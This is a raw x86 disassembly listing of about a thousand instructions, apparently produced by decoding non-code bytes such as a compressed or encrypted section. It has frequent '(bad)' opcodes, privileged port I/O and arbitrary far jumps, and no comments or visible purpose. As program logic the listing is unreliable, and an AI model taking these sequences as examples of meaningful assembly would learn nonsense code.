  40fc9b:	scas   al,BYTE PTR es:[edi]
  40fc9c:	(bad)  
  40fc9f:	pop    edx
  40fca0:	sbb    DWORD PTR [esi+0x40],0xffffffbe
  40fca4:	cmp    eax,0xed34380
  40fca9:	scas   al,BYTE PTR es:[edi]
  40fcaa:	xor    esp,DWORD PTR cs:0x885ed44e
  40fcb1:	push   esp
  40fcb2:	ret    
  40fcb3:	and    eax,0xd67a7887
  40fcb8:	call   0x890c:0x44d1e201
  40fcbf:	lea    ebp,[ebx+eiz*8]
  40fcc2:	cmp    dh,BYTE PTR [edi+0x6f3b3304]
  40fcc8:	por    mm0,QWORD PTR [eax]
  40fccb:	xchg   edx,ebp
  40fccd:	mov    bl,0x93
  40fccf:	mov    dl,0x3f
  40fcd1:	arpl   WORD PTR [eax+0x4d407e67],bp
  40fcd7:	xor    bh,dh
  40fcd9:	push   0xddeb020b
  40fcde:	dec    ebp
  40fcdf:	mov    edx,0xd7edf4e5
  40fce4:	xor    al,BYTE PTR ds:0x698f3b99
  40fcea:	inc    ebp
  40fceb:	push   0x32
  40fced:	push   es
  40fcee:	pop    ecx
  40fcef:	inc    ebp
  40fcf0:	mov    bh,0xe4
  40fcf2:	sbb    BYTE PTR [edx-0xf5fa0e1],0xe9
  40fcf9:	sub    eax,0xe876b1c4
  40fcfe:	push   edi
  40fcff:	test   al,0xe7
  40fd01:	cmp    eax,0x72310573
  40fd06:	addr16 out 0x38,al
  40fd09:	adc    ecx,DWORD PTR [esi]
  40fd0b:	sbb    cl,BYTE PTR [esi-0x14d9e1bb]
  40fd11:	test   BYTE PTR [eax],0x10
  40fd14:	shr    BYTE PTR [esp+ebp*1+0x40],cl
  40fd18:	jmp    0x1f1a:0x7378d4ee
  40fd1f:	inc    esp
  40fd20:	push   0x57046dd1
  40fd25:	aaa    
  40fd26:	xor    bl,BYTE PTR [eax-0x18f4afd7]
  40fd2c:	jmp    0x1d6b18c1
  40fd31:	xchg   edx,eax
  40fd32:	dec    esp
  40fd33:	push   cs
  40fd34:	(bad)  
  40fd35:	adc    bl,dh
  40fd37:	out    dx,eax
  40fd38:	pop    ebx
  40fd39:	mov    ebp,0xf143d119
  40fd3e:	xchg   esp,eax
  40fd3f:	jne    0x40fcc6
  40fd41:	push   ebp
  40fd42:	mov    bh,0x37
  40fd44:	xor    edx,ebx
  40fd46:	loopne 0x40fdac
  40fd48:	or     al,0xcc
  40fd4a:	push   esi
  40fd4b:	mulps  xmm3,XMMWORD PTR [ebx]
  40fd4e:	repnz sbb al,BYTE PTR [edx+0x48fa64d9]
  40fd55:	push   eax
  40fd56:	loope  0x40fcfc
  40fd58:	ret    
  40fd59:	dec    ecx
  40fd5a:	mov    esp,0xaf1bd26d
  40fd5f:	adc    BYTE PTR [ebx+0x641bb396],ch
  40fd65:	inc    edi
  40fd66:	call   0xcf58381f
  40fd6b:	dec    BYTE PTR [eax-0x40]
  40fd6e:	arpl   WORD PTR [ebx+0x1f],bx
  40fd71:	mov    al,ds:0x579fed72
  40fd76:	pop    ebx
  40fd77:	(bad)  
  40fd78:	mov    ds:0x8cb3606d,eax
  40fd7d:	sahf   
  40fd7e:	stos   DWORD PTR es:[edi],eax
  40fd7f:	cmp    BYTE PTR [ecx+esi*8],ch
  40fd82:	retf   0x932c
  40fd85:	pop    esi
  40fd86:	test   DWORD PTR [eax-0x5998437b],ecx
  40fd8c:	xor    DWORD PTR [eax],eax
  40fd8e:	mov    al,ds:0x28ed9a89
  40fd93:	jno    0x40fd5e
  40fd95:	sti    
  40fd96:	out    dx,al
  40fd97:	mov    DWORD PTR [edi-0x1c],esi
  40fd9a:	fucom  st(6)
  40fd9c:	dec    ebx
  40fd9d:	add    BYTE PTR [esi+0x6c9d3db5],0xb8
  40fda4:	mov    ecx,0x82a64d6a
  40fda9:	mov    gs,WORD PTR [ebp-0x50c3a3ba]
  40fdaf:	nop
  40fdb0:	dec    ebx
  40fdb1:	cmp    eax,0xad9c49cc
  40fdb6:	int3   
  40fdb7:	shld   DWORD PTR [ecx],ecx,cl
  40fdba:	add    eax,0x5423ca48
  40fdbf:	leave  
  40fdc0:	cmp    edx,DWORD PTR [esi+0x60]
  40fdc3:	lea    ecx,[esi+0x24]
  40fdc6:	or     ecx,esp
  40fdc8:	ret    0xdec9
  40fdcb:	fdivr  QWORD PTR [edi+0x61c718a8]
  40fdd1:	xor    al,ah
  40fdd3:	outs   dx,BYTE PTR ds:[esi]
  40fdd4:	gs mov cl,0x19
  40fdd7:	in     al,0xe8
  40fdd9:	fwait
  40fdda:	jb     0x40fda0
  40fddc:	daa    
  40fddd:	(bad)  
  40fdde:	sar    BYTE PTR [edx],0x6e
  40fde1:	jnp    0x40fe17
  40fde3:	(bad)  
  40fde5:	dec    edi
  40fde6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fde7:	sub    al,0x11
  40fde9:	jnp    0x40fe2a
  40fdeb:	xor    eax,0x6f34849d
  40fdf0:	aam    0xe8
  40fdf2:	jns    0x40fd7c
  40fdf4:	sbb    ecx,DWORD PTR [edi]
  40fdf6:	lods   eax,DWORD PTR ds:[esi]
  40fdf7:	mov    bl,BYTE PTR [eax+0xb]
  40fdfa:	je     0x40fe63
  40fdfc:	sbb    bl,BYTE PTR [ecx-0x5a]
  40fdff:	mov    al,ds:0x861b35df
  40fe04:	sbb    eax,0xe10496bb
  40fe09:	xor    DWORD PTR [esi],0xabe5663d
  40fe0f:	adc    al,0xea
  40fe11:	cwde   
  40fe12:	loope  0x40fe0b
  40fe14:	mov    edx,0x9de856a2
  40fe19:	mov    edx,0xc0bb5d2e
  40fe1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe1f:	jb     0x40fe15
  40fe21:	cld    
  40fe22:	push   edx
  40fe23:	sbb    BYTE PTR [edi],ch
  40fe25:	sti    
  40fe26:	test   eax,0x3f2894ee
  40fe2b:	in     eax,0xaa
  40fe2d:	lds    eax,FWORD PTR [ebx-0x607e2e71]
  40fe33:	mov    DWORD PTR [esi+0x8],eax
  40fe36:	pushf  
  40fe37:	push   eax
  40fe38:	(bad)  
  40fe39:	cmp    eax,0x4bcb831d
  40fe3e:	pop    esi
  40fe3f:	cmp    ah,dl
  40fe41:	aad    0x67
  40fe43:	sbb    eax,0xedb73c1d
  40fe48:	xor    eax,0xd1bc2508
  40fe4d:	imul   ebx,edi,0xffffff96
  40fe50:	(bad)  
  40fe51:	call   0x77bc:0x3975c018
  40fe58:	ins    DWORD PTR es:[edi],dx
  40fe59:	sbb    al,0xf4
  40fe5b:	pop    ebp
  40fe5c:	mov    DWORD PTR [ebx+0x9],edx
  40fe5f:	sbb    DWORD PTR [ecx-0x2f3a64b8],0xffffffa6
  40fe66:	inc    edi
  40fe67:	mov    BYTE PTR [eax],al
  40fe69:	cmp    al,0x83
  40fe6b:	(bad)  
  40fe6c:	retf   0x1700
  40fe6f:	and    BYTE PTR [ecx+edi*2+0xb],dh
  40fe73:	push   ecx
  40fe74:	scas   eax,DWORD PTR es:[edi]
  40fe75:	ss sahf 
  40fe77:	imul   edi,DWORD PTR [ebx-0xdd979bd],0x4b4297c0
  40fe81:	std    
  40fe82:	in     eax,0x63
  40fe84:	mov    ?,WORD PTR [ebp-0x72d5116f]
  40fe8a:	popa   
  40fe8b:	dec    esi
  40fe8c:	xlat   BYTE PTR ds:[ebx]
  40fe8d:	inc    edx
  40fe8e:	ret    
  40fe8f:	adc    cl,BYTE PTR [edi]
  40fe91:	add    eax,0x730ad573
  40fe96:	push   ss
  40fe97:	inc    ecx
  40fe98:	pop    ebx
  40fe99:	scas   eax,DWORD PTR es:[edi]
  40fe9a:	sub    DWORD PTR [edi+ecx*1],ebp
  40fe9d:	sub    al,bl
  40fe9f:	ret    
  40fea0:	imul   ebp,DWORD PTR ds:0xa50a320e,0x6734dc04
  40feaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feab:	stos   DWORD PTR es:[edi],eax
  40feac:	repz retf 
  40feae:	call   0x7d2b:0xb7b7b501
  40feb5:	aas    
  40feb6:	out    0x76,al
  40feb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feb9:	icebp  
  40feba:	fcom   st(2)
  40febc:	mov    edi,0x230f3df2
  40fec1:	sub    eax,0xe2395ca4
  40fec6:	mov    ds:0x6f93fc2,al
  40fecb:	arpl   WORD PTR [edi+0x6ba13801],bx
  40fed1:	ror    BYTE PTR [ebx+ebp*1],1
  40fed4:	xor    dh,dl
  40fed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fed7:	jl     0x40fe8e
  40fed9:	mov    dl,dl
  40fedb:	sub    BYTE PTR [ecx-0x15],bh
  40fede:	sbb    DWORD PTR [edx],edi
  40fee0:	cmp    ecx,ebp
  40fee2:	out    dx,eax
  40fee3:	dec    eax
  40fee4:	fsub   DWORD PTR [edx]
  40fee6:	add    ch,BYTE PTR [eax+0x1fc6e761]
  40feec:	mov    edx,ebp
  40feee:	push   ss
  40feef:	pushf  
  40fef0:	pop    es
  40fef1:	cmp    cl,BYTE PTR [esi-0x23]
  40fef4:	xor    esp,ecx
  40fef6:	and    BYTE PTR [ebx],0x4e
  40fef9:	sbb    ch,0xe3
  40fefc:	fist   WORD PTR [esi-0x24]
  40feff:	pop    eax
  40ff00:	push   eax
  40ff01:	iret   
  40ff02:	bound  ecx,QWORD PTR [ebp-0x4df4b90d]
  40ff08:	stos   DWORD PTR es:[edi],eax
  40ff09:	pop    edx
  40ff0a:	push   esi
  40ff0b:	add    ebp,0xfb3ee30c
  40ff11:	xchg   esi,eax
  40ff12:	jns    0x40ff3f
  40ff14:	xchg   edx,eax
  40ff15:	in     eax,dx
  40ff16:	inc    ebp
  40ff17:	fld    st(3)
  40ff19:	test   al,0x48
  40ff1b:	xor    DWORD PTR [esi-0x34],esi
  40ff1e:	and    al,0x7
  40ff20:	xchg   ebp,eax
  40ff21:	dec    ebx
  40ff22:	stos   DWORD PTR es:[edi],eax
  40ff23:	popa   
  40ff24:	dec    cl
  40ff26:	fistp  QWORD PTR [edx-0x67b9b786]
  40ff2c:	jns    0x40ff5c
  40ff2e:	sbb    BYTE PTR [ecx],dl
  40ff30:	xor    bl,BYTE PTR [eax]
  40ff32:	add    ebx,DWORD PTR [edx+0x165b8609]
  40ff38:	out    0xde,eax
  40ff3a:	jns    0x40ff47
  40ff3c:	leave  
  40ff3d:	sub    al,0x24
  40ff3f:	xchg   esp,eax
  40ff40:	jmp    0xfd18cc39
  40ff45:	mov    WORD PTR [esi],cs
  40ff47:	mov    eax,ds:0xbeb36027
  40ff4c:	xchg   esp,eax
  40ff4d:	ficomp DWORD PTR [ecx+edx*4]
  40ff50:	rol    BYTE PTR [ebx],1
  40ff52:	loop   0x40fee9
  40ff54:	mov    ch,0xd7
  40ff56:	stos   BYTE PTR es:[edi],al
  40ff57:	fmul   st,st(3)
  40ff59:	repz daa 
  40ff5b:	sbb    al,bl
  40ff5d:	std    
  40ff5e:	cmc    
  40ff5f:	xor    edi,DWORD PTR [edx]
  40ff61:	sub    al,0xef
  40ff63:	dec    eax
  40ff64:	pop    ebx
  40ff65:	sar    BYTE PTR ds:0x9a5c8bd6,1
  40ff6b:	inc    edx
  40ff6c:	sbb    DWORD PTR [ebp-0x67],edi
  40ff6f:	push   cs
  40ff70:	out    0x8f,al
  40ff72:	push   ebp
  40ff73:	rol    BYTE PTR [ebp-0x3c],1
  40ff76:	xor    eax,0x9c97e66b
  40ff7b:	mov    ah,0x6b
  40ff7d:	fbstp  TBYTE PTR [ebx]
  40ff7f:	pushf  
  40ff80:	mov    dh,0xa4
  40ff82:	jbe    0x40ffd8
  40ff84:	jle    0x40ff84
  40ff86:	out    0x63,eax
  40ff88:	push   esp
  40ff89:	adc    edi,ebp
  40ff8b:	or     DWORD PTR [eax-0x22fc5c36],ebp
  40ff91:	pop    ecx
  40ff92:	add    cl,BYTE PTR [esi]
  40ff94:	pop    ds
  40ff95:	loope  0x40fff0
  40ff97:	out    0xef,eax
  40ff99:	cmc    
  40ff9a:	cmp    al,BYTE PTR [eax-0x661a31b4]
  40ffa0:	add    DWORD PTR [edi+edx*2+0x7e],esp
  40ffa4:	stos   DWORD PTR es:[edi],eax
  40ffa5:	xor    eax,0x9b2a643f
  40ffaa:	push   es
  40ffab:	xchg   edx,eax
  40ffac:	lods   al,BYTE PTR ds:[esi]
  40ffad:	sub    al,0x22
  40ffaf:	rcr    bl,cl
  40ffb1:	push   0xb897a1d1
  40ffb6:	enter  0xf12e,0x73
  40ffba:	in     al,dx
  40ffbb:	inc    ebp
  40ffbc:	fist   DWORD PTR [ebx-0x3]
  40ffbf:	retf   0x79c1
  40ffc2:	std    
  40ffc3:	(bad)  
  40ffc4:	mov    bh,0xa2
  40ffc6:	fstp   TBYTE PTR [edi-0x59c1aef4]
  40ffcc:	pop    esi
  40ffcd:	adc    BYTE PTR [ebp-0x6a],cl
  40ffd0:	mov    ds:0x9030e88d,al
  40ffd5:	ins    BYTE PTR es:[edi],dx
  40ffd6:	sub    eax,0x6e7e6282
  40ffdb:	inc    ecx
  40ffdc:	out    0xa8,al
  40ffde:	or     esp,edx
  40ffe0:	ins    BYTE PTR es:[edi],dx
  40ffe1:	or     BYTE PTR [ebx],al
  40ffe3:	pop    esp
  40ffe4:	fcmovnb st,st(7)
  40ffe6:	jl     0x410060
  40ffe8:	cmp    al,0x2b
  40ffea:	test   eax,0x103857d3
  40ffef:	mov    bh,0x8f
  40fff1:	popa   
  40fff2:	jp     0x410049
  40fff4:	cld    
  40fff5:	(bad)  [ecx-0x634b3d7a]
  40fffb:	cmc    
  40fffc:	inc    esi
  40fffd:	mov    DWORD PTR [ecx+0x4a],esp
  410000:	mov    ds:0xc11d940b,eax
  410005:	push   esi
  410006:	pop    ds
  410007:	mov    ecx,0x47057e43
  41000c:	sbb    al,0xd3
  41000e:	add    eax,0xf13c4206
  410013:	inc    edx
  410014:	dec    edi
  410015:	shl    BYTE PTR [ecx-0x27],1
  410018:	lock dec edx
  41001a:	int3   
  41001b:	call   0x8582:0x5590d7cf
  410022:	or     ah,BYTE PTR fs:[ebp+eiz*2-0x5cf80e92]
  41002a:	xchg   ecx,eax
  41002b:	push   cs
  41002c:	adc    DWORD PTR [edi+ecx*1],ecx
  41002f:	pop    esi
  410030:	xor    eax,0x52ff6aa7
  410035:	dec    eax
  410036:	cwde   
  410037:	push   0xffffff9c
  410039:	xor    al,0x7d
  41003b:	mov    edx,0x2e9cb590
  410040:	mov    edi,DWORD PTR [edi+0x6916a984]
  410046:	jl     0x410054
  410048:	add    esi,DWORD PTR [edx-0x54]
  41004b:	push   ebx
  41004c:	lods   eax,DWORD PTR ds:[esi]
  41004d:	in     eax,0xe
  41004f:	sub    BYTE PTR [edx],al
  410051:	pop    edx
  410052:	add    eax,0x4ffc71f4
  410057:	add    edi,DWORD PTR [esi+0x4f9b3a60]
  41005d:	sahf   
  41005e:	nop    DWORD PTR [edx]
  410061:	pushf  
  410062:	jp     0x41004c
  410064:	jno    0x41005f
  410066:	retf   
  410067:	jno    0x410022
  410069:	js     0x410048
  41006b:	imul   edx,DWORD PTR [edx+0x6d985867],0xfffffffc
  410072:	(bad)  
  410074:	inc    ebp
  410075:	mov    edi,0x585b137c
  41007a:	jmp    0x41005d
  41007c:	mov    dl,0x82
  41007e:	addr16 lahf 
  410080:	(bad)  
  410081:	call   0xf7dbada9
  410086:	in     al,dx
  410087:	jmp    0x410026
  410089:	aam    0xe8
  41008b:	gs loopne 0x410040
  41008e:	add    DWORD PTR [ebx+0x69],esi
  410091:	(bad)  
  410093:	loope  0x410068
  410095:	xlat   BYTE PTR ds:[ebx]
  410096:	jge    0x41002c
  410098:	adc    ebx,DWORD PTR [esi]
  41009a:	adc    al,0x8a
  41009c:	fidivr WORD PTR [edi]
  41009e:	mov    ecx,edx
  4100a0:	mov    ds:0x10aa6b00,eax
  4100a5:	popf   
  4100a6:	ss mov dl,0xe6
  4100a9:	push   0xffffff8f
  4100ab:	cld    
  4100ac:	loopne 0x41010b
  4100ae:	and    BYTE PTR [edi+eax*1+0x16],0xeb
  4100b3:	daa    
  4100b4:	xor    esi,ebx
  4100b6:	dec    esi
  4100b7:	push   0xa9986475
  4100bc:	and    DWORD PTR [ecx+esi*8],esi
  4100bf:	pusha  
  4100c0:	xor    ebx,edx
  4100c2:	mov    al,ch
  4100c4:	cmp    al,0xfa
  4100c6:	loopne 0x410058
  4100c8:	mov    al,ds:0x821960d5
  4100cd:	in     al,0x96
  4100cf:	std    
  4100d0:	(bad)  
  4100d1:	xor    DWORD PTR gs:[edi],ebx
  4100d4:	dec    edx
  4100d5:	aas    
  4100d6:	cmp    edi,DWORD PTR [edx+0x24cc7470]
  4100dc:	mov    ds:0x5f4dacdf,al
  4100e1:	in     eax,0x15
  4100e3:	aam    0xca
  4100e5:	push   eax
  4100e6:	fdivp  st(5),st
  4100e8:	popa   
  4100e9:	aam    0x5c
  4100eb:	test   al,0x79
  4100ed:	das    
  4100ee:	jecxz  0x4100a4
  4100f0:	bound  edx,QWORD PTR [ecx+0x290e6124]
  4100f6:	dec    ecx
  4100f7:	sbb    al,0x6f
  4100f9:	and    al,0x7
  4100fb:	rcl    al,cl
  4100fd:	and    al,0xb4
  4100ff:	(bad)  
  410100:	int    0xac
  410102:	es push edx
  410104:	(bad)  
  410105:	mov    edx,0x63080ac9
  41010a:	in     eax,0x4d
  41010c:	test   BYTE PTR [esi+0x19ce9859],bl
  410112:	push   0x8501ad4e
  410117:	dec    eax
  410118:	sub    ecx,DWORD PTR [ecx+esi*1-0x2c]
  41011c:	ja     0x4100f6
  41011e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41011f:	(bad)  
  410120:	sub    DWORD PTR [ebp-0x74],ecx
  410123:	test   BYTE PTR [ebx+0x63],0xb6
  410127:	mov    dl,0x71
  410129:	dec    esp
  41012a:	push   ecx
  41012b:	sar    BYTE PTR [ebp-0x5e],1
  41012e:	popa   
  41012f:	sub    eax,0x8e3a9ed5
  410134:	adc    BYTE PTR ss:[edi+0x2bc66404],0xa2
  41013c:	cmp    BYTE PTR [ebp+edx*4+0x68],ah
  410140:	add    DWORD PTR [edx+0x1f],ebx
  410143:	ret    0x1f16
  410146:	pusha  
  410147:	xor    eax,0x24169cd0
  41014c:	inc    eax
  41014d:	lock adc al,0x28
  410150:	jle    0x410169
  410152:	outs   dx,BYTE PTR ds:[esi]
  410153:	jbe    0x4101ac
  410155:	xchg   BYTE PTR [esi],bl
  410157:	dec    eax
  410158:	cmp    dl,BYTE PTR [ecx]
  41015a:	test   BYTE PTR [ebx+0x53],dh
  41015d:	lahf   
  41015e:	mov    eax,ds:0x91c8e778
  410163:	mov    DWORD PTR [edx-0x17],0x50154f05
  41016a:	or     ah,BYTE PTR [ebx]
  41016c:	das    
  41016d:	loopne 0x4100f2
  41016f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410170:	scas   eax,DWORD PTR es:[edi]
  410171:	jne    0x41013c
  410173:	(bad)  
  410174:	loopne 0x4101d6
  410176:	in     al,dx
  410177:	mov    DWORD PTR [ebx+ecx*1],esi
  41017a:	xor    BYTE PTR [eax-0x2b],cl
  41017d:	xchg   edi,eax
  41017e:	or     ebx,DWORD PTR [ebp-0x11]
  410181:	mov    dh,0x2c
  410183:	dec    ebx
  410184:	popa   
  410185:	scas   al,BYTE PTR es:[edi]
  410186:	lea    ebx,ds:0x9fc57c52
  41018c:	call   0xa3b066e5
  410191:	les    eax,FWORD PTR [eax-0x6b2c2703]
  410197:	addr16 jne 0x4101e3
  41019a:	mov    ds:0x897f15d6,al
  41019f:	fidivr WORD PTR [ebx+0x1f]
  4101a2:	mov    esi,0x1b43d82d
  4101a7:	aam    0x9b
  4101a9:	aaa    
  4101aa:	sbb    al,0x50
  4101ac:	shl    DWORD PTR [ecx-0x74f12589],0x84
  4101b3:	leave  
  4101b4:	sub    ebx,ebx
  4101b6:	push   ebp
  4101b7:	icebp  
  4101b8:	(bad)  
  4101b9:	aad    0x51
  4101bb:	iret   
  4101bc:	jns    0x4101b7
  4101be:	aas    
  4101bf:	mul    BYTE PTR [ecx-0x16]
  4101c2:	inc    esi
  4101c3:	sub    BYTE PTR [eax-0x40],ah
  4101c6:	xor    al,0x7c
  4101c8:	jge    0x4101b4
  4101ca:	pop    esi
  4101cb:	aaa    
  4101cc:	(bad)  
  4101cd:	fiadd  DWORD PTR [edx-0x5b]
  4101d0:	mov    al,ds:0xa652c5d6
  4101d5:	adc    eax,0xf35fea73
  4101da:	sub    al,0x57
  4101dc:	fucomip st,st(3)
  4101de:	je     0x410214
  4101e0:	(bad)  
  4101e2:	inc    eax
  4101e3:	stos   DWORD PTR es:[edi],eax
  4101e4:	xlat   BYTE PTR ds:[ebx]
  4101e5:	jae    0x410247
  4101e7:	xchg   edx,eax
  4101e8:	add    ecx,eax
  4101ea:	dec    esi
  4101eb:	and    BYTE PTR gs:[edx+0x1e],bh
  4101ef:	retf   0xc037
  4101f2:	push   esi
  4101f3:	xchg   esp,eax
  4101f4:	leave  
  4101f5:	push   cs
  4101f6:	repnz dec esp
  4101f8:	xlat   BYTE PTR ds:[ebx]
  4101f9:	sub    BYTE PTR [ebp+ebx*2+0x1b],dl
  4101fd:	sar    ecx,0x44
  410200:	loop   0x4101fa
  410202:	and    ah,BYTE PTR [edi]
  410204:	add    al,BYTE PTR [esi+0x5f]
  410207:	xor    ch,ch
  410209:	mov    ds:0x328e99d8,al
  41020e:	mov    eax,ds:0xad55d591
  410213:	stos   BYTE PTR es:[edi],al
  410214:	sti    
  410215:	daa    
  410216:	imul   ecx,DWORD PTR gs:[ebx],0x51
  41021a:	xchg   ecx,eax
  41021b:	mov    edx,0xd1d132e4
  410220:	and    DWORD PTR [esi-0x22],eax
  410223:	loop   0x410245
  410225:	std    
  410226:	jbe    0x410272
  410228:	xchg   esi,eax
  410229:	add    al,0x9e
  41022b:	mov    al,ds:0xf500e2d8
  410230:	push   ds
  410231:	daa    
  410232:	or     BYTE PTR [ecx-0x121e7963],ch
  410238:	outs   dx,DWORD PTR ds:[esi]
  410239:	and    DWORD PTR [eax],eax
  41023b:	fsubr  DWORD PTR [edi]
  41023d:	test   eax,0x77f16c50
  410242:	adc    esi,DWORD PTR [edx+0x4e]
  410245:	std    
  410246:	mov    ah,0x6
  410248:	retf   0xc7db
  41024b:	jns    0x41028c
  41024d:	(bad)  
  41024e:	addr16 mov ds:0xc678,eax
  410252:	(bad)  
  410253:	sahf   
  410254:	xchg   ecx,eax
  410255:	test   DWORD PTR [edx+0x41],edx
  410258:	outs   dx,BYTE PTR ds:[esi]
  410259:	jns    0x4102d3
  41025b:	jno    0x4101e4
  41025d:	ret    0x3f88
  410260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410261:	sbb    ch,BYTE PTR [ebx]
  410263:	out    0xd1,al
  410265:	add    eax,0x57deb630
  41026a:	cdq    
  41026b:	push   ss
  41026c:	sub    eax,DWORD PTR [esi+eax*2+0x2218e1bf]
  410273:	into   
  410274:	aaa    
  410275:	mov    dl,0xb4
  410277:	jle    0x410297
  410279:	daa    
  41027a:	push   esi
  41027b:	dec    ebx
  41027c:	dec    edi
  41027d:	les    esi,FWORD PTR [esi]
  41027f:	(bad)  
  410280:	xchg   ebp,eax
  410281:	mov    ah,BYTE PTR [ebx]
  410283:	cmc    
  410284:	pop    eax
  410285:	fld    QWORD PTR [esi+edi*2+0x3e]
  410289:	adc    eax,0x15fda7f0
  41028e:	loopne 0x4102d7
  410290:	pop    es
  410291:	sbb    eax,0x5d0d08f9
  410296:	popa   
  410297:	and    eax,0x35bb9e04
  41029c:	neg    DWORD PTR [ebp+0x72]
  41029f:	mov    bl,BYTE PTR [esi]
  4102a1:	add    BYTE PTR [edx+0x4f8f015a],0xbb
  4102a8:	in     al,0x90
  4102aa:	jl     0x41027c
  4102ac:	jnp    0x41026e
  4102ae:	inc    esp
  4102af:	js     0x410329
  4102b1:	push   eax
  4102b2:	xchg   ebx,eax
  4102b3:	sub    cl,dh
  4102b5:	adc    eax,0x4aaba2c8
  4102ba:	mov    dl,0x81
  4102bc:	or     bl,BYTE PTR [eax-0x63acab0c]
  4102c2:	je     0x410337
  4102c4:	loope  0x410319
  4102c6:	std    
  4102c7:	add    eax,0x3d7a78fc
  4102cc:	xchg   edi,eax
  4102cd:	jae    0x41030b
  4102cf:	stos   BYTE PTR es:[edi],al
  4102d0:	jno    0x4102a0
  4102d2:	ss ins BYTE PTR es:[edi],dx
  4102d4:	stc    
  4102d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102d6:	out    0xac,al
  4102d8:	imul   edx,DWORD PTR [edx+0x38],0xc084b2be
  4102df:	adc    cl,BYTE PTR [eax+0x18]
  4102e2:	nop
  4102e3:	dec    edx
  4102e4:	dec    DWORD PTR [eax+esi*1-0x29351119]
  4102eb:	fimul  DWORD PTR [ebx]
  4102ed:	sbb    esi,DWORD PTR [ebp-0x7e806999]
  4102f3:	mov    esp,edx
  4102f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102f6:	xchg   DWORD PTR [eax+0x2d13493d],esi
  4102fc:	mov    eax,ds:0x6239439b
  410301:	jns    0x41033e
  410303:	cmp    BYTE PTR [ebx+0x7b],bh
  410306:	in     al,0x1b
  410308:	jae    0x4102de
  41030a:	scas   eax,DWORD PTR es:[edi]
  41030b:	add    BYTE PTR [esi+eiz*1+0x7e],al
  41030f:	cmp    DWORD PTR [edx],0x4cc2cfdb
  410315:	dec    ecx
  410316:	pusha  
  410317:	neg    DWORD PTR [bx+di+0x50]
  41031b:	lods   al,BYTE PTR ss:[esi]
  41031d:	out    0x99,al
  41031f:	jecxz  0x4102d1
  410321:	xor    BYTE PTR [eax+ebx*1+0x36983c97],0x76
  410329:	ss dec edx
  41032b:	leave  
  41032c:	gs das 
  41032e:	mov    bh,0x63
  410330:	mov    cl,0x55
  410332:	push   es
  410333:	and    ecx,edi
  410335:	retf   0xd2d6
  410338:	sub    al,0x9a
  41033a:	mov    bl,0x4c
  41033c:	mov    bl,0xfe
  41033e:	dec    edx
  41033f:	pushf  
  410340:	xor    ebx,DWORD PTR [edx+0x5f3eef90]
  410346:	jae    0x4102fa
  410348:	push   eax
  410349:	jmp    DWORD PTR [ecx]
  41034b:	aas    
  41034c:	xchg   BYTE PTR [edx+0x4407e441],ah
  410352:	push   0x34915b95
  410357:	jb     0x41036f
  410359:	pop    ss
  41035a:	mov    eax,0x3ae7a337
  41035f:	sub    al,0xec
  410361:	mov    dl,0xa5
  410363:	out    dx,eax
  410364:	push   cs
  410365:	(bad)  
  410366:	leave  
  410367:	mov    BYTE PTR [ecx+0x52],cl
  41036a:	sbb    DWORD PTR [eax+0x40],edx
  41036d:	in     al,0x7f
  41036f:	add    eax,0xbffef74c
  410374:	mov    eax,0x194e46ad
  410379:	ret    0x4736
  41037c:	std    
  41037d:	das    
  41037e:	pop    ds
  41037f:	mov    gs:0xda2dbe7a,al
  410385:	ja     0x410403
  410387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410388:	clc    
  410389:	or     al,0x5e
  41038b:	cmc    
  41038c:	add    eax,0xbcfa0b32
  410391:	test   al,0x53
  410393:	push   ss
  410394:	ins    BYTE PTR es:[edi],dx
  410395:	jnp    0x4103e5
  410397:	adc    eax,0x9fee18f1
  41039c:	mov    eax,ds:0x4e8c73e3
  4103a1:	outs   dx,BYTE PTR ds:[esi]
  4103a2:	pop    ss
  4103a3:	dec    edi
  4103a4:	mov    edi,eax
  4103a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103a7:	ja     0x410376
  4103a9:	inc    eax
  4103aa:	adc    eax,0xbe9f31db
  4103af:	dec    edx
  4103b0:	cmp    ebp,ecx
  4103b2:	std    
  4103b3:	jno    0x4103ee
  4103b5:	inc    ebx
  4103b6:	leave  
  4103b7:	fiadd  WORD PTR [eax-0x3a]
  4103ba:	in     al,0x7c
  4103bc:	inc    esi
  4103bd:	sbb    eax,0x9424e88b
  4103c2:	lea    edx,[ecx+0x48]
  4103c5:	int    0x9e
  4103c7:	sbb    ax,0x1641
  4103cb:	scas   eax,DWORD PTR es:[edi]
  4103cc:	add    cl,0x66
  4103cf:	mov    BYTE PTR [esp+edi*1],al
  4103d2:	frstor [edx+esi*8+0x4676b179]
  4103d9:	cmp    al,0x74
  4103db:	imul   esp,DWORD PTR [ebp+0x316de9bb],0xfd2d5960
  4103e5:	fnstcw WORD PTR [ebx-0x49]
  4103e8:	jae    0x4103b0
  4103ea:	and    BYTE PTR [esi+ebp*4+0x4c],dh
  4103ee:	cli    
  4103ef:	and    DWORD PTR ds:0xc4008f59,0x1e
  4103f6:	xor    BYTE PTR [eax-0x47024f27],dl
  4103fc:	mov    ds:0xd34cedef,al
  410401:	or     ebp,edi
  410403:	cdq    
  410404:	mul    BYTE PTR [ebp-0x5e]
  410407:	add    eax,0xae578807
  41040c:	imul   edi,DWORD PTR [edx],0xc
  41040f:	inc    esi
  410410:	push   ss
  410411:	mov    ebx,0xcdb4c645
  410416:	adc    DWORD PTR [ebp-0x5b],edi
  410419:	lods   al,BYTE PTR ds:[esi]
  41041a:	xchg   esi,eax
  41041b:	pop    es
  41041c:	arpl   WORD PTR [eax+0x15],cx
  41041f:	(bad)  
  410420:	aam    0x2c
  410422:	or     al,0x12
  410424:	clc    
  410425:	xchg   BYTE PTR [ebp+0x1],dl
  410428:	pop    es
  410429:	cmp    DWORD PTR [eax-0x55],esi
  41042c:	out    0x10,eax
  41042e:	ror    BYTE PTR [esi-0x5a],1
  410431:	pop    ebp
